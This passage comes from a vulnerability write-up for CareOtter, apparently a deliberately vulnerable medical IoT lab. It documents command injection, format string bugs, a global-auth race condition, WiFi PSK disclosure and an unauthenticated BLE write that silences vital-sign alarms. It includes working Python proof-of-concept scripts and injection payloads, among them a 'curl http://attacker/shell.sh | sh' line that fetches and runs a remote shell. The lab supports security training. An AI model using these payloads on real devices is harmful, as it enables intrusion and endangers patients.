The `careservice` binary is deployed as a pre-compiled ELF for aarch64-cortex-a53 without any integrity verification mechanism. There is no signature check on the binary at startup, no secure boot chain, and no protection against replacement via the filesystem. An attacker who gains write access to `/opt/careotter/` can substitute the binary with a trojanized version that persists across service restarts.

**References:** OWASP IoT Top 10 — I4

---

### IoT:I6 — Insufficient Privacy Protection

#### 6.1 WiFi PSK disclosure via IGP GET_NETWORK

After authenticating with the hardcoded token, command `0x03` returns the raw contents of `/etc/config/wireless`, which includes the WiFi PSK in plaintext:

```bash
$ python3 -c "
import socket, struct
MAGIC = 0x43415245
def igp(cmd, p=b''):
    h = struct.pack('>IBBH', MAGIC, cmd, 0, len(p))
    with socket.create_connection(('192.168.2.1', 9999)) as s:
        s.sendall(h + p); return s.recv(4096)
igp(0x02, b'OtterMobile2026')
print(igp(0x03).decode())
"
config wifi-device 'radio0'
    ...
config wifi-iface 'default_radio0'
    option ssid 'HomeNetwork'
    option key 'mypassword123'
    ...
```

The WiFi PSK also appears in the Cloud API response at `GET /api/network` in the `raw` field when `VULNERABLE=1`.

**References:** OWASP IoT Top 10 — I6 · CWE-312

---

### IoT:I7 — Insecure Data Transfer and Storage

#### 7.1 Global authentication state persists between TCP connections

The `authenticated` variable in `careservice.c` is a global integer initialized to zero at process startup. It is never reset when a connection closes:

```c
/* careservice.c:35 */
int authenticated = 0;
```

Once any client sends `0x02` with the correct token, all subsequent connections — including those from different hosts — inherit the authenticated state until the daemon is restarted. This means an attacker can authenticate and then a separate, unrelated client immediately has admin access without supplying credentials.

**References:** OWASP IoT Top 10 — I7 · CWE-613 — Insufficient Session Expiration

---

#### 7.2 Authentication State Race Condition

**Type:** CWE-362 — Concurrent Execution using Shared Resource with Improper Synchronization  
**Prerequisite:** CWE-613 (§7.1) — `authenticated` is process-global, not connection-scoped  
**OWASP IoT Top 10:** I7 (primary) · I2 (insecure network service)  
**Severity:** High

##### Description

When a legitimate client implements the auth → cmd → deauth mitigation pattern (IGP `0x02` → command → IGP `0x0D`), careservice necessarily opens a **privilege window** spanning three independent TCP connections. Any attacker with network access to port 9999 can insert a privileged IGP command during this window **without supplying any credentials**.

The window exists because the `authenticated` flag is process-global (`careservice.c:35`) and each IGP command uses a separate TCP connection — the server closes the socket after each response. No lock or mutex at the client side (Cloud API or mobile app) can prevent an external TCP client from inserting between connection 1 (auth) and connection 3 (deauth).

This is distinct from IoT:I7.1: that vulnerability requires the attacker to know the token and authenticate themselves. This race condition requires **zero credentials** — it parasitizes the legitimate admin's authentication.

##### Attack Timeline

```
[Legitimate admin action — e.g. POST /api/network or "WiFi Config" in mobile app]

t+ 0ms  TCP conn 1  →  IGP 0x02 AUTHENTICATE  →  authenticated = 1
        ┌──────────────────────────────────────────────────────────────────┐
        │  PRIVILEGE WINDOW                                                │
        │  Any TCP client on :9999 executes protected commands            │
        │  without credentials. Duration: ~2–50 ms (one network RTT).    │
        └──────────────────────────────────────────────────────────────────┘
t+Xms  TCP conn 2  →  IGP 0x03 GET_NETWORK  →  command executed (admin)
t+Yms  TCP conn 3  →  IGP 0x0D DEAUTHENTICATE  →  authenticated = 0

Attacker (no token required):
  Monitoring :9999 for incoming SYN from admin client...
  On SYN detected → immediately send IGP 0x06:

  IGP 0x06 payload: "' && curl http://attacker/shell.sh | sh #|x"
  → RCE as root on the Raspberry Pi
```

##### Conditions Required

| Condition | Required | Notes |
|-----------|:--------:|-------|
| Network access to `192.168.2.1:9999` | ✓ | Any host on `192.168.2.0/24` or LAN |
| IGP token `OtterMobile2026` | **✗** | Not needed — relies on victim's auth |
| Admin performs a protected action | ✓ | Cloud API call or mobile app button tap |
| IGP protocol knowledge | ✓ | Documented in firmware source; trivially extracted |

##### Exploit Proof-of-Concept

The attacker monitors port 9999 and fires a privileged command the moment they detect an incoming admin connection:

```python
import socket, struct, threading

MAGIC = 0x43415245

def igp_inject(cmd, payload=b''):
    """Send a privileged IGP command without authenticating."""
    hdr = struct.pack('>IBBH', MAGIC, cmd, 0, len(payload))
    with socket.create_connection(('192.168.2.1', 9999), timeout=1) as s:
        s.sendall(hdr + payload)
        return s.recv(4096)

def monitor_and_inject():
    """Wait for admin activity on :9999, then inject a shell command."""
    # Step 1: detect auth window (poll until 0x06 is accepted without RESTRICTED)
    while True:
        try:
            resp = igp_inject(0x06, b"injected_ssid'; touch /tmp/race_pwned #|x")
            if b'WIFI_UPDATED' in resp or b'WIFI_ERR' in resp:
                print("[+] Race window hit — command executed:", resp)
                break
            # b'RESTRICTED' → window not open yet, retry
        except Exception:
            pass

threading.Thread(target=monitor_and_inject, daemon=True).start()
print("[*] Waiting for admin to trigger any protected action on the device...")
```

##### Difference from IoT:I7.1

| | IoT:I7.1 — Global Auth State Persistence | IoT:I7.2 — Auth State Race Condition |
|-|------------------------------------------|--------------------------------------|
| Attacker needs token | Yes (to set `authenticated=1`) | **No** (relies on victim's auth) |
| Concurrent admin activity required | No (state persists indefinitely) | Yes (timing-dependent) |
| Window duration | Indefinite until process restart | ~2–50 ms per admin action |
| Mitigated by IGP 0x0D DEAUTHENTICATE | Partially — reduces window to ms | **No** — window still exists |
| Mitigated by client-side Lock | N/A | No — only serializes API clients |

##### Root Cause in `careservice.c`

```c
/* careservice.c:35 — root cause: global auth state, not per connection */
int authenticated = 0;

/* main() loop — each connection inherits the process-global state */
while (1) {
    int c_fd = accept(s_fd, NULL, NULL);  /* new TCP connection */
    handle_request(c_fd);                 /* reads ONE command, responds */
    close(c_fd);                          /* close socket — authenticated is NOT reset */
}
```

The architectural fix requires scoping `authenticated` to the connection descriptor, not the process. Moving the declaration inside `handle_request()` would isolate each TCP connection:

```c
void handle_request(int c_fd) {
    int authenticated = 0;  /* scoped to this connection — each client starts unauthenticated */
    /* ... */
}
```

This would eliminate both IoT:I7.1 and IoT:I7.2 simultaneously, but is intentionally left unfixed in the lab.

**References:** CWE-362 · CWE-613 · OWASP IoT Top 10 — I7 · ETSI EN 303 645 §5.5

---

### IoT:I8 — Lack of Device Management

#### 8.1 Zombie process accumulation (REBOOT_SERVICE)

Command `0x09` forks a child process to restart a service but never calls `waitpid()`:

```c
pid_t pid = fork();
if (pid == 0) {
    execv(svc_path, argv);
    _exit(1);
} else if (pid > 0) {
    /* FLAW: no waitpid() — child becomes zombie */
    send(c_fd, "SVC_RESTART_QUEUED", 18, 0);
}
```

Each restart request leaves an entry in the process table that is never reaped. Under sustained use or automated testing, this exhausts the system's process table, leading to denial of service on an embedded device with limited resources.

**References:** OWASP IoT Top 10 — I8 · CWE-404 — Improper Resource Shutdown or Release

---

### IoT:I9 — Insecure Default Settings

#### 9.1 Format string vulnerability in VERIFY_STATUS (cmd `0x05`)

The diagnostic command passes the payload directly as the format string argument to `snprintf`:

```c
/* careservice.c:154 */
char report_header[128];
snprintf(report_header, 128, module_name);   /* ← FORMAT STRING */
```

An attacker can send a payload containing format specifiers to read stack memory (`%x`, `%s`) or write to arbitrary addresses (`%n`):

```python
# Read stack values
igp(0x05, b'%x.%x.%x.%x.%x')
# → "1f4.400.0.bffffea8.474f4154..."

# Read stack values — second sink (cmd 0x0B DEFIBRILLATE)
igp(0x02, b'OtterMobile2026')
igp(0x0B, b'%x.%x.%x.%x')
# → Written to /opt/careotter_events.log
```

Note: `0x05` does not require authentication. `0x0B` requires authentication but has a second independent format string sink in the events log write path.

**References:** OWASP IoT Top 10 — I9 · CWE-134 — Use of Externally-Controlled Format String

---

#### 9.2 Integer underflow in SET_PREFS TLV parser (cmd `0x04`)

`parse_preferences()` uses a `uint16_t remaining` counter that can underflow when a TLV length field exceeds the number of bytes left in the buffer:

```c
uint8_t t_len = data[cursor++];
remaining -= 2;                     /* underflow possible here */
if (t_len <= remaining) {
    memcpy(local_store, &data[cursor], t_len);  /* BOF if t_len > 128 */
```

Sending a TLV with `Type=0xAA, Len=0xFF` followed by only 4 bytes of value causes `remaining` to underflow and the subsequent `memcpy` to write beyond the 128-byte `local_store` stack buffer.

```python
igp(0x02, b'OtterMobile2026')
payload = bytes([0xAA, 0xFF]) + b'A' * 4   # len=255, only 4 bytes provided
igp(0x04, payload)
```

**References:** OWASP IoT Top 10 — I9 · CWE-191 — Integer Underflow · CWE-121 — Stack-based Buffer Overflow

---

#### 9.3 Shell injection in SET_WIFI (cmd `0x06`)

The SSID and PSK fields from the payload are interpolated directly into a shell command passed to `system()` without escaping shell metacharacters:

```c
snprintf(cmd, sizeof(cmd),
         "uci set wireless.@wifi-iface[0].ssid='%s' && "
         "uci set wireless.@wifi-iface[0].key='%s' && "
         "uci commit wireless && wifi reload",
         ssid, psk);
system(cmd);
```

An SSID value such as `'; reboot #` or `' && curl http://attacker/shell.sh | sh #` causes arbitrary command execution with the privileges of `careservice` (root):

```python
igp(0x02, b'OtterMobile2026')
# Inject via SSID field
igp(0x06, b"' && reboot #|validpassword123")
```

**References:** OWASP IoT Top 10 — I9 · CWE-78 — Improper Neutralization of Special Elements used in an OS Command

---

#### 9.4 Command injection in EMERGENCY_ALERT (cmd `0x0C`)

The alert message payload is embedded directly into a `curl` shell invocation:

```c
snprintf(cmd, sizeof(cmd),
         "curl -s -X POST '%s' -d 'msg=%s' > /dev/null 2>&1",
         url, (char*)payload);
system(cmd);
```

Payload `test'; reboot #` breaks out of the `curl` argument and executes arbitrary commands:

```python
igp(0x02, b'OtterMobile2026')
igp(0x0C, b"normal'; touch /tmp/pwned #")
```

**References:** CWE-78 · OWASP IoT Top 10 — I9

---

#### 9.5 BLE threshold write without authentication (CSCP v1)

The GATT characteristic `0xFF01` accepts `WriteValue` calls from any connected BLE client without any session-level authentication. The CSCP v1 "encryption" (AES-128-ECB with hardcoded key) provides no authentication guarantee — it only acts as a serialization format. An attacker who extracts the key writes arbitrary threshold values:

```python
from Crypto.Cipher import AES
import struct, zlib

KEY    = b"careotter-key-16"
MAGIC  = 0xCAFE0DDA

def cscp_pack(bpm_min, bpm_max, spo2_min):
    plaintext = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b'\x00' * 13
    crc = zlib.crc32(plaintext) & 0xFFFFFFFF
    ct  = AES.new(KEY, AES.MODE_ECB).encrypt(plaintext)
    return struct.pack(">II", MAGIC, crc) + ct

# Silence all alerts
pkt = cscp_pack(0, 255, 0)
# Write to characteristic 0xFF01 via nRF Connect or bleak
```

**References:** OWASP Mobile M3 — Insecure Authentication · CWE-306

---

## Attack Chains

All attack chains are documented as step-by-step playbooks with concrete commands in [`Attack_Playbook.md`](../Attack_Playbook.md). The table below serves as an index.

| Chain | Vector | Physical Access | Key Vulns | Playbook |
|-------|--------|-----------------|-----------|----------|
| **A** | IGP v4 (TCP :9999) | No | Hardcoded token (I1), Command injection (I9.1) | [Link ↗](../Attack_Playbook.md#chain-a--remote-code-execution-via-network) |
| **B** | BLE GATT | BLE range (~10–30 m) | ManufacturerData leak (I3), Hardcoded CSCP key (M1) | [Link ↗](../Attack_Playbook.md#chain-b--patient-safety-attack-via-ble) |
| **C** | IGP v4 or HTTP | No | PSK plaintext disclosure (I6) | [Link ↗](../Attack_Playbook.md#chain-c--wifi-credential-theft) |
| **D** | IGP v4 | No | Format string (I9.2) | [Link ↗](../Attack_Playbook.md#chain-d--stack-disclosure-via-format-string) |
| **E** | BLE GATT (provisioning) | BLE range | Hidden service (P1), No pairing (P2), Hardcoded PIN (P3), Shell injection (P4), SSRF (P6), Factory reset (P7) | [Link ↗](../Attack_Playbook.md#chain-e--full-device-compromise-from-ble-proximity) |
| **F** | BLE GATT + HTTP | BLE range + network | P1, P2, P3, P4, P6, Hardcoded signature | [Link ↗](../Attack_Playbook.md#chain-f--cloud-api-impersonation-via-signature-interception) |

---

## Regulatory Context

Medical IoT devices are subject to specific regulatory frameworks. The vulnerabilities present in CareOtter map to requirements that real devices must meet:

| Vulnerability | Relevant Standard | Requirement violated |
|--------------|------------------|---------------------|
| Hardcoded token | IEC 62443-3-3 SR 1.5 | Authenticator management |
| No transport encryption | FDA Cybersecurity Guidance 2023 | Data integrity in transit |
| Unauthenticated threshold write | IEC 62601 / ISO 14971 | Risk management — safety function protection |
| Global auth state | ETSI EN 303 645 §5.5 | Session management |
| PSK disclosure | GDPR Art. 32 | Security of processing |
| Format string / command injection | IEC 62443-4-1 | Secure coding requirements |
| Hidden provisioning backdoor | IEC 62443-3-3 SR 1.1 | Identification and authentication control |
| Hardcoded factory PIN | IEC 62443-3-3 SR 1.5 | Authenticator management |
| BLE shell injection / SSRF | IEC 62443-4-1 | Secure coding — input validation |
| Provisioning channel never expires | ETSI EN 303 645 §5.4 | Secure software development lifecycle |

---

## Quick Reference

For concrete commands, payloads, and one-liners for every attack surface, see [`Attack_Playbook.md`](../Attack_Playbook.md#quick-reference--one-liners).
